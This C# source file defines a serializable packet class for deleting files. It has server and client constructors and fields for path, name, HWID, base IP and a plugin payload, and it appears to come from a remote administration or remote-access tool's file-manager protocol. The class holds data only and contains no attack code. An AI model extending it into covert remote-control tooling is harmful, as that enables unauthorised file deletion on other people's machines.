using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DeleteFilePacket : IPacket
    {
        //server
        public DeleteFilePacket(string path, string name, long fileTicket) : base()
        {
            PacketType = PacketType.FM_DELETE_FILE;

            this.path = path;
            this.name = name;
            this.fileTicket = fileTicket;
        }

        //client
        public DeleteFilePacket(string path, string name, bool deleted, string baseIp, string HWID, long fileTicket) : base()
        {
            PacketType = PacketType.FM_DELETE_FILE;
            this.BaseIp = baseIp;
            this.HWID = HWID;
            this.fileTicket = fileTicket;

            this.path = path;
            this.name = name;
            this.deleted = deleted;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }
        public long fileTicket { get; set; }

        public string path { get; set; }
        public string name { get; set; }
        public bool deleted { get; set; }
    }
}
